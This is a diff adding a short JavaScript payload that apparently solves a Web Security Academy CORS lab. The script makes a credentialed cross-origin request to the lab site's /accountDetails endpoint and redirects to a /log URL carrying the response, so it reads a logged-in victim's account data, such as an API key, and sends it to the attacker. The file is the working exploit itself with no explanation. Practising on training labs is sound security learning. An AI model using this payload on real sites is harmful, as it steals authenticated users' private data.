@@ -1,0 +1,11 @@
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','0a5d001f0467d4e7c0ac2d6e00a30076.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+    function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
